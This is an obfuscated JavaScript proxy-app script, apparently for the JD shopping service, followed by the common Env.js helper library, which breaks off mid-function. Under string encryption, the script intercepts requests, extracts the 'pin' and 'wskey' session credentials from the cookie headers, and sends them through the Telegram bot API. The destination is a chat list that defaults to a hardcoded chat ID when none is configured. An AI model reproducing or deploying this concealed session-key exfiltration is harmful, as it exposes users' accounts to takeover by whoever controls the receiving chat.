var _0xodL='jsjiami.com.v6',_0xodL_=['‮_0xodL'],_0x1550=[_0xodL,'w4bDjDzCpBxlw6TCpw==','wp/CvUtNwrfCsMKT','w4AvFsK7wqw=','w4nDi8K7BMOI','fcOQQ8KsCA==','wrJjwodgUw==','WQwow53DnUE=','VzdawrAv','KMOtwrXDqw8=','MUvCvsOVSQ==','HV54wqUS','HMKUXA==','w6DDjMOkwopuZ8OXw75G','wpbCvVptwoPCtMKewo3CnMOJ','wrzCvjMlw7o2','woXCmwkNw6k=','44K76LWT5Y2d','5pmt5pee5LmR5LqqYXTCv8OVCA==','F1zCvsON','SMKnLsOnwos=','KcOpwq/DrxPDlA==','QMKSJcOzwpUJD8OOw6vCgQ==','w5gQw54OWwYr','w7rDpCk1w6s=','OH14UMO5','L3dAdMO7','woXDj8ONwpTCusKa','wrcNw4AcZg==','woLDoyfDsB8=','aMKbwrFqw5w=','JMK8ZCoawpbDuMKXRsKC','BsKQXTot','wpvDsMOEODI=','8LS/rlfDl1dmw4YV5o255Lu/5oqp5Ymbw7AQ','w50CBMOERVnDgg==','8YGOpMOgZHrDiMOmw6TmjIXkuLnmirDli5vjgq4=','woAZF2DDpQ==','wpXCq1g=','GMOjJMO/w7k=','w7RWEw==','4piD77iZCQHDhMOLDeadmOWPkeWJq+++suaek+aspeS7iuaNiOS6t+ODpCnDog==','wozDiMOG','FnJjSsOM','cjR5wosN','JOKZl++5j8K35YWZ5YSc5LuP5Lq9w53ClsOCH8O65YWw54ya6ZaJ6KyRw7rig4Xvurof','fwDDtkHDt8KLSgrDkA==','wrBRw63CtcKuZMO2VRY=','wpBIwqFXbMOxw7A=','w6VGwpnCn8KV','A0bCo8OA','YUzDicKTGA==','bg5Lwp0d','SAwrw7zDuw==','wobDrcOuJzo=','6KyY6YWP6K6G44KR','UiJawqM0ZRlmwqU4fcKdKsOTwoLDsmLDpRnCh8OkUsKjdHTDi8O9dw==','SFrCqMOLdy/CgsOsQMOpw7kU','wr8awpjDjkI6','dRLChcOIQDfDgMOewo9Dw49mwqoLw4rCmsKtLsKbLcK0w6jChMKewpnDsMKlN8KZew==','HnxBUw==','w4TCjAwkKw==','fSbDi07Dkw==','w61Dwo7CtMKH','w6/DiAYCw5s=','TcKXw40=','wqjimKLvu7Nt5YS85Yar5Lil5LqWPMK/w7J0MOWGtueOmOmUjuitkjDigq3vur/DuA==','w4LCoR8MEMKBwrvCoMOg','wqjDu33CjsKz','wpLDssOFISQ=','dTjDiQ==','HHZBY8OXw7lh','8KSsmU7CgsKTYsO4wpzmjpDkuLnmi4rlirXjg60=','wozDnW3CiMKlYWvChBDCrA==','w47DrcKb','4pmv77m9Zn3DmcKjAsKz5o+W5Lut5aaY6Lau44O2DWM=','w6HDncOlwqdhdMOf','w71LBsOrwo/CrMOvH8O+w4I=','wrYDw5M=','GFgTwqvDssKpfR7Dvi3DgcOjehvCosKpaMOew6PloqTlhq3pl5joro7jgqXDvQ==','wpPDnsOSJj3DiGE=','wr3DinPCgsKwTGnChlTCiyzCsBTCmcKmUgt3wpnlo73lh53pl6bor7TjgIE=','eknDmA==','wrRXw6ASwroIwrLDtcKB','wrcPw7tYDw==','ZkfDjcK4NQ==','worDj8OF','8JGvnw7ChDQUUzDmjJTku6zmiITliKxUwrw=','4pi577mhw53DoUVMwrHDieaOoeS4hOWkt+i1vuOBkC5O','4piP77moV8OXV2bDhhXmjbnku7/lpojot6Hjg7g=','B2rDjxvDnnNjbQnCqsO+fzYyw7fDsnLDhsKX5aKb5YeK6ZWw6KyJ44ONwp0=','wrVGw6E/wrUbwro=','w7sCG8OlQ1/DggHCiRnDlsKww5puwqUlwqJUHuWjieWEp+mUkeisjeOCjg==','w7sCG8OlQ1/DggHCiRnDlsKww5puwqUlwqJUHuWjieWEp+mUkeisjeOCjsOr','JsOoIMOYw54=','w7s1KMK5wozCiw==','YB1twqUQ','HsKeXhscwqPDhsKnbsKi','BgnDiQ==','K8OtwqzDrQ==','XcKCIsOj','PlgMworDtMKvfQ==','5LiP5LiKCQHDhMOLDeaOouS6rQ==','w7vDncO3wodlcsON','BsOjwq7Dow7DmQ==','cTLDj8KuwqNhXQ==','CBXDgS0ARw==','I358wow/','DMOhcMOSJA==','w7dRATDDgMO6KyZGwojDu8Ox','CcO1GsKRwoFdw7w=','w449wrbDs29YwoDDty7DokkPDXALw6TCrmM=','KG/Cn8O+w78iFn0AwrgdwrQKfkknbsKEw7UrwoMgwpEIwqAhccKzw6PDkX1TB8Ktwq7DomjDgD8swr5UBxDCrmw=','wqnDuxfCrj9Jw5jDhcKbFQ==','G240wovDjMKESDTCgTrDvcOSCDDChMKG','VcKxwpdfw4g=','w74LwonDsldzwrU=','AcO/OMOYw4MeXA9ew75fPTNkwqfDqA==','wrkSw7lsPg==','5pyV5ouM5YuOwoccwp3CnwMs','FsOzb8OUNQLDo8Ondg==','6aWu5qyM5YWZ5YWW5Lql5Lqfw5TDrsKew7jDmQ==','D3t6wrwa','4pq577mYwo7lhZPlhqPkur/kuLIdRsOAQsKM5aW66LSe','Dx/DnSU=','KFIRwqs=','wpQkw7VzLMOd','Qjsjiahwmi.KrcoEm.glhvWbx6Slr=='];if(function(_0x45a625,_0x3574a0,_0x321481){function _0x312c13(_0x1b9fb9,_0x5a878b,_0x247e87,_0x20aaed,_0x83ff45,_0x3de018){_0x5a878b=_0x5a878b>>0x8,_0x83ff45='po';var _0x547478='shift',_0x6fb4e1='push',_0x3de018='‮';if(_0x5a878b<_0x1b9fb9){while(--_0x1b9fb9){_0x20aaed=_0x45a625[_0x547478]();if(_0x5a878b===_0x1b9fb9&&_0x3de018==='‮'&&_0x3de018['length']===0x1){_0x5a878b=_0x20aaed,_0x247e87=_0x45a625[_0x83ff45+'p']();}else if(_0x5a878b&&_0x247e87['replace'](/[QhwKrEglhWbxSlr=]/g,'')===_0x5a878b){_0x45a625[_0x6fb4e1](_0x20aaed);}}_0x45a625[_0x6fb4e1](_0x45a625[_0x547478]());}return 0xd1851;};return _0x312c13(++_0x3574a0,_0x321481)>>_0x3574a0^_0x321481;}(_0x1550,0x161,0x16100),_0x1550){_0xodL_=_0x1550['length']^0x161;};function _0x5765(_0x154dca,_0xf38f5c){_0x154dca=~~'0x'['concat'](_0x154dca['slice'](0x1));var _0x49334e=_0x1550[_0x154dca];if(_0x5765['SxWBDm']===undefined){(function(){var _0x110982=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x51e780='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x110982['atob']||(_0x110982['atob']=function(_0x3c263c){var _0x35ba43=String(_0x3c263c)['replace'](/=+$/,'');for(var _0xff18b2=0x0,_0x102172,_0x542f11,_0x19b5ea=0x0,_0x28335a='';_0x542f11=_0x35ba43['charAt'](_0x19b5ea++);~_0x542f11&&(_0x102172=_0xff18b2%0x4?_0x102172*0x40+_0x542f11:_0x542f11,_0xff18b2++%0x4)?_0x28335a+=String['fromCharCode'](0xff&_0x102172>>(-0x2*_0xff18b2&0x6)):0x0){_0x542f11=_0x51e780['indexOf'](_0x542f11);}return _0x28335a;});}());function _0x5edb8f(_0x1c0e73,_0xf38f5c){var _0x1e5c71=[],_0x509b3c=0x0,_0x271cfd,_0x16c9a1='',_0x56799c='';_0x1c0e73=atob(_0x1c0e73);for(var _0x43a799=0x0,_0x122950=_0x1c0e73['length'];_0x43a799<_0x122950;_0x43a799++){_0x56799c+='%'+('00'+_0x1c0e73['charCodeAt'](_0x43a799)['toString'](0x10))['slice'](-0x2);}_0x1c0e73=decodeURIComponent(_0x56799c);for(var _0x43a36f=0x0;_0x43a36f<0x100;_0x43a36f++){_0x1e5c71[_0x43a36f]=_0x43a36f;}for(_0x43a36f=0x0;_0x43a36f<0x100;_0x43a36f++){_0x509b3c=(_0x509b3c+_0x1e5c71[_0x43a36f]+_0xf38f5c['charCodeAt'](_0x43a36f%_0xf38f5c['length']))%0x100;_0x271cfd=_0x1e5c71[_0x43a36f];_0x1e5c71[_0x43a36f]=_0x1e5c71[_0x509b3c];_0x1e5c71[_0x509b3c]=_0x271cfd;}_0x43a36f=0x0;_0x509b3c=0x0;for(var _0x5dfc38=0x0;_0x5dfc38<_0x1c0e73['length'];_0x5dfc38++){_0x43a36f=(_0x43a36f+0x1)%0x100;_0x509b3c=(_0x509b3c+_0x1e5c71[_0x43a36f])%0x100;_0x271cfd=_0x1e5c71[_0x43a36f];_0x1e5c71[_0x43a36f]=_0x1e5c71[_0x509b3c];_0x1e5c71[_0x509b3c]=_0x271cfd;_0x16c9a1+=String['fromCharCode'](_0x1c0e73['charCodeAt'](_0x5dfc38)^_0x1e5c71[(_0x1e5c71[_0x43a36f]+_0x1e5c71[_0x509b3c])%0x100]);}return _0x16c9a1;}_0x5765['hvuuED']=_0x5edb8f;_0x5765['lXSEHB']={};_0x5765['SxWBDm']=!![];}var _0x44713c=_0x5765['lXSEHB'][_0x154dca];if(_0x44713c===undefined){if(_0x5765['xDstFG']===undefined){_0x5765['xDstFG']=!![];}_0x49334e=_0x5765['hvuuED'](_0x49334e,_0xf38f5c);_0x5765['lXSEHB'][_0x154dca]=_0x49334e;}else{_0x49334e=_0x44713c;}return _0x49334e;};const $=new Env(_0x5765('‮0','Dk34'));let CK=$request[_0x5765('‮1','BUZ!')][_0x5765('‮2','N@3Q')]||$request[_0x5765('‮3','@XVs')][_0x5765('‫4','dKvR')];const pin=CK[_0x5765('‫5','eu85')](/pin=([^=;]+?);/)[0x1];const key=CK[_0x5765('‮6','Dnei')](/wskey=([^=;]+?);/)[0x1];$[_0x5765('‮7','Dk34')]=$[_0x5765('‫8','*EzC')](_0x5765('‮9','nkaE'))||_0x5765('‫a','@XVs');$[_0x5765('‫b','8m*x')]=!$['getData'](_0x5765('‮c','kpFq'))?['-1001745074244']:JSON[_0x5765('‫d','yiyZ')]($[_0x5765('‫e','nkaE')](_0x5765('‫f','@UwI')));!(async()=>{var _0x29fbb9={'VbspZ':function(_0x2495c1,_0x493d10){return _0x2495c1===_0x493d10;},'SApJE':_0x5765('‮10','$68e'),'OiXUo':function(_0x34aaf4,_0x2d9231){return _0x34aaf4!==_0x2d9231;},'MKTFq':function(_0x40525a,_0x2c6b5c){return _0x40525a!==_0x2c6b5c;},'wUxaU':function(_0x4606b0,_0x74dc7){return _0x4606b0||_0x74dc7;},'JYjpa':_0x5765('‫11','*FAu'),'WuYGR':_0x5765('‮12','Dnei'),'kIGIm':'【账号】','ZJUCz':function(_0x4678b5,_0x551087){return _0x4678b5+_0x551087;},'fPnpK':function(_0xc5bae2,_0x3c7f58){return _0xc5bae2+_0x3c7f58;},'ykhXE':_0x5765('‮13','[2)t'),'VnJwO':_0x5765('‮14','eu85'),'vkfEd':'LUCrx','zKeZn':'TgJhZ','OkQJO':function(_0x3259ac,_0x4b99ed,_0x4e9851){return _0x3259ac(_0x4b99ed,_0x4e9851);},'NOWbc':'⚠️WsKey未变动，本次不提交。','xaQmz':_0x5765('‮15','@XVs'),'HbWXJ':'请重试。'};if(_0x29fbb9['wUxaU'](!pin,!key)){$[_0x5765('‮16','dKvR')]=_0x29fbb9['JYjpa'];$['msg']($['name'],$['subt'],$['desc']);$[_0x5765('‫17','kpFq')]();}try{const _0x1dfca0=_0x5765('‫18','$68e')+key+_0x5765('‫19','8m*x')+pin+';';const _0x51e1ac=pin;const _0x4099fa=decodeURIComponent(_0x51e1ac);let _0xd96bd=JSON['parse']($[_0x5765('‮1a','8AO#')](_0x29fbb9[_0x5765('‫1b','&3IG')])||'[]');let _0x59c714;let _0x4ac0a9=_0x29fbb9[_0x5765('‮1c','#OH9')];const _0x36c974=_0xd96bd['find']((_0x12ef58,_0x4a679a)=>{if(_0x5765('‫1d','8Stg')!==_0x5765('‮1e','[2)t')){const _0x15af86=_0x12ef58[_0x5765('‮1f','R$nf')];const _0x2c0baf=_0x15af86?_0x15af86[_0x5765('‮20','(LbT')](/pin=.+?;/)?_0x15af86[_0x5765('‫21','N@3Q')](/pin=(.+?);/)[0x1]:null:null;const _0x4f9307=_0x29fbb9[_0x5765('‫22','1eW^')](_0x51e1ac,_0x2c0baf);if(_0x4f9307){if(_0x29fbb9[_0x5765('‮23','eu85')]!=='ZEgzk'){console[_0x5765('‮24','d9Tw')](''+JSON[_0x5765('‫25','BUZ!')](err));}else{_0x59c714=_0x4a679a;if(_0x29fbb9['OiXUo'](_0x15af86,_0x1dfca0)){$['needUpload']=!![];}}}return _0x4f9307;}else{$[_0x5765('‫26','8AO#')]=!![];}});let _0x936a0f='';if(_0x36c974){_0xd96bd[_0x59c714][_0x5765('‫27','aX*5')]=_0x1dfca0;_0x4ac0a9=_0x29fbb9[_0x5765('‫28','aX*5')](_0x5765('‫29','%w1h'),_0x59c714+0x1)+'】';_0x936a0f=_0x5765('‫2a','nkaE');}else{_0xd96bd[_0x5765('‫2b','1eW^')]({'userName':_0x4099fa,'cookie':_0x1dfca0});_0x4ac0a9=_0x29fbb9['ZJUCz'](_0x29fbb9[_0x5765('‫2c','9BBI')]('【账号',_0xd96bd[_0x5765('‮2d','N@3Q')]),'】');_0x936a0f=_0x29fbb9['ykhXE'];$[_0x5765('‮2e','9BBI')]=!![];}$[_0x5765('‮2f','%w1h')](JSON['stringify'](_0xd96bd,null,0x2),_0x29fbb9[_0x5765('‫30','7gi3')]);if($['needUpload']){if(_0x29fbb9[_0x5765('‫31','eweb')]!==_0x5765('‫32','eweb')){const _0x11aee1=item[_0x5765('‮33','qXU#')];const _0x5e3edf=_0x11aee1?_0x11aee1[_0x5765('‫34','Czpe')](/pin=.+?;/)?_0x11aee1[_0x5765('‫35','OtRY')](/pin=(.+?);/)[0x1]:null:null;const _0x1ab66b=_0x51e1ac===_0x5e3edf;if(_0x1ab66b){_0x59c714=index;if(_0x29fbb9[_0x5765('‮36','yiyZ')](_0x11aee1,_0x1dfca0)){$['needUpload']=!![];}}return _0x1ab66b;}else{for(const _0x5555ba of $[_0x5765('‮37','d9Tw')]){if(_0x29fbb9[_0x5765('‫38','d9Tw')]===_0x29fbb9[_0x5765('‮39','FCq!')]){console[_0x5765('‮24','d9Tw')](_0x5765('‮3a','9SA3')+pin);$[_0x5765('‫3b','9SA3')]=_0x5765('‮3c','[2)t')+pin;}else{await _0x29fbb9[_0x5765('‮3d','iadH')](updateCookie,_0x1dfca0,_0x5555ba);await showMsg(_0x5555ba);}}}}else{$[_0x5765('‫3e','8AO#')](_0x29fbb9[_0x5765('‮3f','@UwI')]);console[_0x5765('‫40','Wda^')](_0x5765('‫41','Dk34')+pin);}return;}catch(_0x436cac){$[_0x5765('‫42','FCq!')](_0x29fbb9[_0x5765('‮43','eweb')],'',_0x29fbb9[_0x5765('‫44','(LbT')]);console['log'](_0x5765('‫45','9BBI')+JSON[_0x5765('‮46','bm[K')](_0x436cac)+'\x0a\x0a'+_0x436cac+'\x0a\x0a'+JSON[_0x5765('‫47','&63S')]($request[_0x5765('‮48','[2)t')])+'\x0a');}})()[_0x5765('‮49','ows]')](_0x18ae55=>$['logErr'](_0x18ae55))['finally'](()=>$[_0x5765('‮4a','1eW^')]());function updateCookie(_0xf7a4d9,_0x8b425b){var _0x223fd2={'uYaAU':function(_0x5873c1,_0x5b90b9){return _0x5873c1!==_0x5b90b9;},'qROfJ':'ykNvH','ATbid':function(_0x46a13f,_0x34304d){return _0x46a13f===_0x34304d;},'sIdCx':_0x5765('‮4b','Whu#'),'vyWec':_0x5765('‮4c','(LbT'),'AmtSU':function(_0x1cebde,_0x203f93){return _0x1cebde===_0x203f93;},'zYhWj':function(_0x599cc9,_0x547716){return _0x599cc9===_0x547716;},'pDSED':function(_0x47bf98,_0x42f189){return _0x47bf98===_0x42f189;},'buxAo':_0x5765('‮4d','R$nf'),'oTWEW':function(_0x346b5c){return _0x346b5c();},'gVOEf':'⚠️\x20写入京东WsKey失败'};return new Promise(_0xfd1e90=>{var _0xf2183d={'kdcHz':_0x223fd2[_0x5765('‮4e','FCq!')],'BYvpb':_0x5765('‮4f','OtRY')};const _0x248576={'url':_0x5765('‫50','(LbT')+$['TG_BOT_TOKEN']+_0x5765('‫51','1eW^'),'headers':{'Content-Type':'application/x-www-form-urlencoded'},'body':'chat_id='+_0x8b425b+_0x5765('‫52','nkaE')+_0xf7a4d9+_0x5765('‫53','a$oq')};$[_0x5765('‮54','eweb')](_0x248576,(_0x367063,_0x1baf02,_0x191174)=>{var _0x27df27={'ZKCvW':function(_0x3fe795,_0x21b400){return _0x223fd2['uYaAU'](_0x3fe795,_0x21b400);}};if(_0x223fd2[_0x5765('‮55','QzwB')](_0x223fd2['qROfJ'],_0x223fd2[_0x5765('‮56','bm[K')])){$['msg'](_0xf2183d[_0x5765('‫57','ows]')],'',_0xf2183d[_0x5765('‮58','7gi3')]);console[_0x5765('‮59','4292')](_0x5765('‫5a','#OH9')+JSON[_0x5765('‫5b','QzwB')](error)+'\x0a\x0a'+error+'\x0a\x0a'+JSON['stringify']($request['headers'])+'\x0a');}else{try{if(_0x367063){if(_0x223fd2[_0x5765('‮5c','Opff')]('GMsZz',_0x223fd2[_0x5765('‫5d','FCq!')])){_0x191174=JSON['parse'](_0x191174);if(_0x191174['ok']){console[_0x5765('‮5e','@XVs')]('🎉\x20WsKey提交成功\x0a\x0a'+pin);$[_0x5765('‮5f','eweb')]=_0x5765('‫60','*EzC')+pin;}else if(_0x191174[_0x5765('‫61','Opff')]===0x190){console[_0x5765('‮62','#OH9')](_0x5765('‫63','iadH')+pin);$[_0x5765('‮64','BUZ!')]='⚠️\x20WsKey提交失败。'+pin;}else if(_0x191174[_0x5765('‮65','Wda^')]===0x191){console[_0x5765('‮66','Czpe')](_0x5765('‮67','kpFq'));$[_0x5765('‮68','FCq!')]=_0x5765('‫69','Opff');}}else{console[_0x5765('‫6a','Whu#')](''+JSON[_0x5765('‮6b','x3G4')](_0x367063));}}else{if(_0x5765('‮6c','$68e')===_0x223fd2['vyWec']){_0x191174=JSON[_0x5765('‫6d','Whu#')](_0x191174);if(_0x191174['ok']){console[_0x5765('‫6e','qXU#')](_0x5765('‮6f','(LbT')+pin);$['resData']='🎉\x20WsKey提交成功。'+pin;}else if(_0x223fd2['AmtSU'](_0x191174['error_code'],0x190)){console['log'](_0x5765('‮70','nkaE')+pin);$['resData']=_0x5765('‫71','9SA3')+pin;}else if(_0x223fd2['zYhWj'](_0x191174['error_code'],0x191)){console[_0x5765('‮66','Czpe')](_0x5765('‮72','7Nk2'));$[_0x5765('‫73','x3G4')]=_0x5765('‫74','9SA3');}}else{console['log'](_0x5765('‮75','9SA3'));$['resData']='Telegram\x20Bot\x20token\x20填写错误。';}}}catch(_0x4fb8d9){if(_0x223fd2[_0x5765('‮76','@UwI')](_0x223fd2['buxAo'],_0x223fd2['buxAo'])){$[_0x5765('‮77','&3IG')](_0x4fb8d9,_0x1baf02);}else{updateIndex=index;if(_0x27df27[_0x5765('‫78','(LbT')](ck,_0xf7a4d9)){$[_0x5765('‮79','d9Tw')]=!![];}}}finally{_0x223fd2['oTWEW'](_0xfd1e90);}}});});}function showMsg(){var _0x1b5b3b={'AepfK':'⚠️\x20服务不可用，请稍后重试。'};return new Promise(_0x553100=>{$[_0x5765('‫7a','dKvR')]($[_0x5765('‫7b','N@3Q')],$[_0x5765('‮7c','9BBI')],$[_0x5765('‫7d','kpFq')]||_0x1b5b3b['AepfK']);_0x553100();});};_0xodL='jsjiami.com.v6';

// https://github.com/chavyleung/scripts/blob/master/Env.js
// prettier-ignore
function Env(name, opts) {
  class Http {
    constructor(env) {
      this.env = env;
    }

    send(opts, method = 'GET') {
      opts = typeof opts === 'string' ? { url: opts } : opts;
      let sender = this.get;
      if (method === 'POST') {
        sender = this.post;
      }
      return new Promise((resolve, reject) => {
        sender.call(this, opts, (err, resp, body) => {
          if (err) reject(err);
          else resolve(resp);
        });
      });
    }

    get(opts) {
      return this.send.call(this.env, opts);
    }

    post(opts) {
      return this.send.call(this.env, opts, 'POST');
    }
  }

  return new (class {
    constructor(name, opts) {
      this.name = name;
      this.http = new Http(this);
      this.data = null;
      this.dataFile = 'box.dat';
      this.logs = [];
      this.isMute = false;
      this.isNeedRewrite = false;
      this.logSeparator = '\n';
      this.startTime = new Date().getTime();
      Object.assign(this, opts);
      this.log('', `🔔${this.name}, 开始!`);
    }

    isNode() {
      return 'undefined' !== typeof module && !!module.exports;
    }

    isQuanX() {
      return 'undefined' !== typeof $task;
    }

    isSurge() {
      return 'undefined' !== typeof $httpClient && 'undefined' === typeof $loon;
    }

    isLoon() {
      return 'undefined' !== typeof $loon;
    }

    isShadowrocket() {
      return 'undefined' !== typeof $rocket;
    }

    toObj(str, defaultValue = null) {
      try {
        return JSON.parse(str);
      } catch {
        return defaultValue;
      }
    }

    toStr(obj, defaultValue = null) {
      try {
        return JSON.stringify(obj);
      } catch {
        return defaultValue;
      }
    }

    getJson(key, defaultValue) {
      let json = defaultValue;
      const val = this.getData(key);
      if (val) {
        try {
          json = JSON.parse(this.getData(key));
        } catch {}
      }
      return json;
    }

    setJson(val, key) {
      try {
        return this.setData(JSON.stringify(val), key);
      } catch {
        return false;
      }
    }

    getScript(url) {
      return new Promise((resolve) => {
        this.get({ url }, (err, resp, body) => resolve(body));
      });
    }

    runScript(script, runOpts) {
      return new Promise((resolve) => {
        let httpApi = this.getData('@chavy_boxjs_userCfgs.httpApi');
        httpApi = httpApi ? httpApi.replace(/\n/g, '').trim() : httpApi;
        let httpApi_timeout = this.getData(
          '@chavy_boxjs_userCfgs.httpApi_timeout'
        );
        httpApi_timeout = httpApi_timeout ? httpApi_timeout * 1 : 20;
        httpApi_timeout =
          runOpts && runOpts.timeout ? runOpts.timeout : httpApi_timeout;
        const [key, addr] = httpApi.split('@');
        const opts = {
          url: `http://${addr}/v1/scripting/evaluate`,
          body: {
            script_text: script,
            mock_type: 'cron',
            timeout: httpApi_timeout,
          },
          headers: { 'X-Key': key, Accept: '*/*' },
        };
        this.post(opts, (err, resp, body) => resolve(body));
      }).catch((e) => this.logErr(e));
    }

    loadData() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require('fs');
        this.path = this.path ? this.path : require('path');
        const curDirDataFilePath = this.path.resolve(this.dataFile);
        const rootDirDataFilePath = this.path.resolve(
          process.cwd(),
          this.dataFile
        );
        const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
        const isRootDirDataFile =
          !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
        if (isCurDirDataFile || isRootDirDataFile) {
          const datPath = isCurDirDataFile
            ? curDirDataFilePath
            : rootDirDataFilePath;
          try {
            return JSON.parse(this.fs.readFileSync(datPath));
          } catch (e) {
            return {};
          }
        } else return {};
      } else return {};
    }

    writeData() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require('fs');
        this.path = this.path ? this.path : require('path');
        const curDirDataFilePath = this.path.resolve(this.dataFile);
        const rootDirDataFilePath = this.path.resolve(
          process.cwd(),
          this.dataFile
        );
        const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
        const isRootDirDataFile =
          !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
        const jsonData = JSON.stringify(this.data);
        if (isCurDirDataFile) {
          this.fs.writeFileSync(curDirDataFilePath, jsonData);
        } else if (isRootDirDataFile) {
          this.fs.writeFileSync(rootDirDataFilePath, jsonData);
        } else {
          this.fs.writeFileSync(curDirDataFilePath, jsonData);
        }
      }
    }

    lodash_get(source, path, defaultValue = undefined) {
      const paths = path.replace(/\[(\d+)\]/g, '.$1').split('.');
      let result = source;
      for (const p of paths) {
        result = Object(result)[p];
        if (result === undefined) {
          return defaultValue;
        }
      }
      return result;
    }

    lodash_set(obj, path, value) {
      if (Object(obj) !== obj) return obj;
      if (!Array.isArray(path)) path = path.toString().match(/[^.[\]]+/g) || [];
      path
        .slice(0, -1)
        .reduce(
          (a, c, i) =>
            Object(a[c]) === a[c]
              ? a[c]
              : (a[c] = Math.abs(path[i + 1]) >> 0 === +path[i + 1] ? [] : {}),
          obj
        )[path[path.length - 1]] = value;
      return obj;
    }

    getData(key) {
      let val = this.getVal(key);
      // 如果以 @
      if (/^@/.test(key)) {
        const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
        const objVal = objKey ? this.getVal(objKey) : '';
        if (objVal) {
          try {
            const objedVal = JSON.parse(objVal);
            val = objedVal ? this.lodash_get(objedVal, paths, '') : val;
          } catch (e) {
            val = '';
          }
        }
      }
      return val;
    }

    setData(val, key) {
      let isSuc = false;
      if (/^@/.test(key)) {
        const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
        const objdat = this.getVal(objKey);
        const objVal = objKey
          ? objdat === 'null'
            ? null
            : objdat || '{}'
          : '{}';
        try {
          const objedVal = JSON.parse(objVal);
          this.lodash_set(objedVal, paths, val);
          isSuc = this.setVal(JSON.stringify(objedVal), objKey);
        } catch (e) {
          const objedVal = {};
          this.lodash_set(objedVal, paths, val);
          isSuc = this.setVal(JSON.stringify(objedVal), objKey);
        }
      } else {
        isSuc = this.setVal(val, key);
      }
      return isSuc;
    }

    getVal(key) {
      if (this.isSurge() || this.isLoon()) {
        return $persistentStore.read(key);
      } else if (this.isQuanX()) {
        return $prefs.valueForKey(key);
      } else if (this.isNode()) {
        this.data = this.loadData();
        return this.data[key];
      } else {
        return (this.data && this.data[key]) || null;
      }
    }

    setVal(val, key) {
      if (this.isSurge() || this.isLoon()) {
        return $persistentStore.write(val, key);
      } else if (this.isQuanX()) {
        return $prefs.setValueForKey(val, key);
      } else if (this.isNode()) {
        this.data = this.loadData();
        this.data[key] = val;
        this.writeData();
        return true;
      } else {
        return (this.data && this.data[key]) || null;
      }
    }

    initGotEnv(opts) {
      this.got = this.got ? this.got : require('got');
      this.ckTough = this.ckTough ? this.ckTough : require('tough-cookie');
      this.ckJar = this.ckJar ? this.ckJar : new this.ckTough.CookieJar();
      if (opts) {
        opts.headers = opts.headers ? opts.headers : {};
        if (undefined === opts.headers.Cookie && undefined === opts.cookieJar) {
          opts.cookieJar = this.ckJar;
        }
      }
    }

    get(opts, callback = () => {}) {
      if (opts.headers) {
        delete opts.headers['Content-Type'];
        delete opts.headers['Content-Length'];
      }
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) {
          opts.headers = opts.headers || {};
          Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false });
        }
        $httpClient.get(opts, (err, resp, body) => {
          if (!err && resp) {
            resp.body = body;
            resp.statusCode = resp.status;
          }
          callback(err, resp, body);
        });
      } else if (this.isQuanX()) {
        if (this.isNeedRewrite) {
          opts.opts = opts.opts || {};
          Object.assign(opts.opts, { hints: false });
        }
        $task.fetch(opts).then(
          (resp) => {
            const { statusCode: status, statusCode, headers, body } = resp;
            callback(null, { status, statusCode, headers, body }, body);
          },
          (err) => callback(err)
        );
      } else if (this.isNode()) {
        this.initGotEnv(opts);
        this.got(opts)
          .on('redirect', (resp, nextOpts) => {
            try {
              if (resp.headers['set-cookie']) {
                const ck = resp.headers['set-cookie']
                  .map(this.ckTough.Cookie.parse)
                  .toString();
                if (ck) {
                  this.ckJar.setCookieSync(ck, null);
                }
                nextOpts.cookieJar = this.ckJar;
              }
            } catch (e) {
              this.logErr(e);
            }
            // this.ckJar.setCookieSync(resp.headers['set-cookie'].map(Cookie.parse).toString())
          })
          .then(
            (resp) => {
              const { statusCode: status, statusCode, headers, body } = resp;
              callback(null, { status, statusCode, headers, body }, body);
            },
            (err) => {
              const { message: error, response: resp } = err;
              callback(error, resp, resp && resp.body);
            }
          );
      }
    }

    post(opts, callback = () => {}) {
      const method = opts.method ? opts.method.toLocaleLowerCase() : 'post';
      // 如果指定了请求体, 但没指定`Content-Type`, 则自动生成
      if (opts.body && opts.headers && !opts.headers['Content-Type']) {
        opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      }
      if (opts.headers) delete opts.headers['Content-Length'];
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) {
          opts.headers = opts.headers || {};
          Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false });
        }
        $httpClient[method](opts, (err, resp, body) => {
          if (!err && resp) {
            resp.body = body;
            resp.statusCode = resp.status;
          }
          callback(err, resp, body);
        });
      } else if (this.isQuanX()) {
        opts.method = method;
        if (this.isNeedRewrite) {
          opts.opts = opts.opts || {};
          Object.assign(opts.opts, { hints: false });
        }
        $task.fetch(opts).then(
          (resp) => {
            const { statusCode: status, statusCode, headers, body } = resp;
            callback(null, { status, statusCode, headers, body }, body);
          },
          (err) => callback(err)
        );
      } else if (this.isNode()) {
        this.initGotEnv(opts);
        const { url, ..._opts } = opts;
        this.got[method](url, _opts).then(
          (resp) => {
            const { statusCode: status, statusCode, headers, body } = resp;
            callback(null, { status, statusCode, headers, body }, body);
          },
          (err) => {
            const { message: error, response: resp } = err;
            callback(error, resp, resp && resp.body);
          }
        );
      }
    }
    /**
     *
     * 示例:$.time('yyyy-MM-dd qq HH:mm:ss.S')
     *    :$.time('yyyyMMddHHmmssS')
     *    y:年 M:月 d:日 q:季 H:时 m:分 s:秒 S:毫秒
     *    其中y可选0-4位占位符、S可选0-1位占位符，其余可选0-2位占位符
     * @param {string} fmt 格式化参数
     * @param {number} 可选: 根据指定时间戳返回格式化日期
     *
     */
    time(fmt, ts = null) {
      const date = ts ? new Date(ts) : new Date();
      let o = {
        'M+': date.getMonth() + 1,
        'd+': date.getDate(),
        'H+': date.getHours(),
        'm+': date.getMinutes(),
        's+': date.getSeconds(),
        'q+': Math.floor((date.getMonth() + 3) / 3),
        S: date.getMilliseconds(),
      };
